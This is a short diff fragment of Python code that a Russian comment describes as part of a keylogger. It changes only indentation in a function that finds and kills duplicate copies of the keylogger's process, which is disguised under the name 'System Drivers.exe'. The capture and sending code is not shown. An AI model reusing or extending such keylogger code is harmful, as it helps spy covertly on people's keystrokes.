@@ -473,12 +473,12 @@ send_control_and_zapis()
 
 #Функция поиска второго процесса, создаваемого кейлогером и его завершение
 def find_process_pid(process_name):
-    for process in process_iter():
-        if process.name() == process_name:
-            if process.pid != getpid():
-            	try:
-                	process.kill()
-                except: 
+	for process in process_iter():
+		if process.name() == process_name:
+			if process.pid != getpid():
+				try:
+					process.kill()
+				except: 
 					pass
 					
 find_process_pid('System Drivers.exe')
